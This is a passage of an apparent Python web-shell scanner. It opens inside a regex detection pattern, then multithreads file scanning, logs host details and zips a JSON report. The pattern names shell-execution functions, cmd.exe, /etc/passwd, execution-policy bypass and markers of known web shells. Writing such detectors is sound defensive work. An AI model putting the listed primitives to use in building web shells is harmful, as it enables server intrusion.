daemonise|C0mmand line|phpinfo\(\) function has non-permissible|letaksekarang|Execute Shell Command|DXGLOBALSHIT|IISSpy|execute request\(|Chmod Ok\!|Upload Gagal|awen asp\.net|execute\(request\(\"|oSNet\.ComputerName|aspencodedll\.aspcoding|vbscript\.encode|exec\(|shell\_exec\(|popen\(|system\(|escapeshellcmd|passthru\(|pcntl\_exec|proc\_open|db\_connect|mysql\_query|execl\(|cmd\.exe|os\.popen|ls\ \-la|\/etc\/passwd|\/etc\/hosts|adodb\.connection|sqlcommandquery|shellexecute|oledbcommand|mime\-version|exif\_read\_data\(|gethostbyname\(|create\_function\(|base64\_decode\(|\-executionpolicy\ bypass"

# Check valid regex and ext
try:
    re.compile(ext)
    re.compile(regex)
except:
    print('Non valid extension input. Exit')
    PressAnyKey()
    exit()

# Get All File
file_list, file_list_all = GetAllFiles(scan_dir, size, ext)

total = [0] * len(file_list)
matched = [0] * len(file_list)
cleared = [0] * len(file_list)

# Define output
os_name = platform.node()
user_name = getpass.getuser()
domain_name = socket.getfqdn()
ip_addr = socket.gethostbyname(socket.gethostname())
scan_time = str(datetime.datetime.today().strftime('%Y-%m-%d-%H-%M-%S'))

output_dir = os_name + "_" + scan_time
os.mkdir(output_dir)
output_zip = "(" + domain_name + ")-(" + ip_addr + ")-(" + \
    scan_time + ")" + ".zip"

# Test open db
TestDatabase()

# Multi Threading
lock = threading.Lock()

i = psutil.cpu_count()  # NUM OF THREAD BASED ON NUM OF CPU ON SYSTEM
if i == 1:
    i = 2

splited_list = list(SplitList(file_list_all, chunk_numbers=i-1))

t = [None] * i
for j in range(i-1):
    t[j] = threading.Thread(target=ScanFunc, args=(
        scan_dir, splited_list[j], output_dir, start_time, lock))
t[i-1] = threading.Thread(target=GetDebugInfo)
for j in range(i):
    t[j].start()
for j in range(i):
    t[j].join()

WriteDebugInfo(total, matched, cleared, scan_dir, total_scan_time, output_dir)

# Zip JSON output
with ZipFile(output_dir + "/" + output_zip, 'w', compression=zipfile.ZIP_DEFLATED) as zip:
    zip.write(output_dir + "/log.json",
              os.path.basename(output_dir + "/log.json"))

# Save file to log server
# SaveToLogServer()

# Delete local unnecessary file
# if os.path.exists(output_dir + "/log.json"):
#     os.remove(output_dir + "/log.json")
